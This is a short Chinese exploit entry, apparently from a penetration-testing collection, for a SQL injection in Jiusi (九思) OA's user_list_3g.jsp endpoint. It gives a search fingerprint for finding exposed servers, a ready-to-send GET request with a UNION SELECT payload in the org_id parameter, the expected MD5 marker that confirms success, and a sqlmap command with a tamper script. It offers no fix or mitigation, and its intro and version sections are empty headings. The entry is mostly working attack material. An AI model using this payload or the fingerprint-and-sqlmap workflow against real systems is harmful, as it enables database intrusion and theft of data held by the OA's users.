# 九思OAuser_list_3g存在SQL注入漏洞

- **系统**：九思　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`web.body="/jsoa/webmail/ajax_util.js"`
- **请求**：`GET /jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0%20%20union/**/select/**/1,concat(111*111,md5(1))%20%23&userIds=1&userNames=1&content=1 HTTP/1.1`

**请求体 / payload**
```
c4ca4238a0b923820dcc509a6f75849b
sqlmap
/jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0&userIds=1&userNames=1&content=1
sqlmap -u "http://xx/jsoa/wap2/personalMessage/user_list_3g.jsp?org_id=0&userIds=1&userNames=1&content=1" --batch -p org_id --tamper=space2comment --random-agent

\[九思OA-user-list-3g-sql注入.yaml]\(公众号：渗透安全HackTwo
```

**其他**
- 九思OA user\_list\_3g存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 九思OA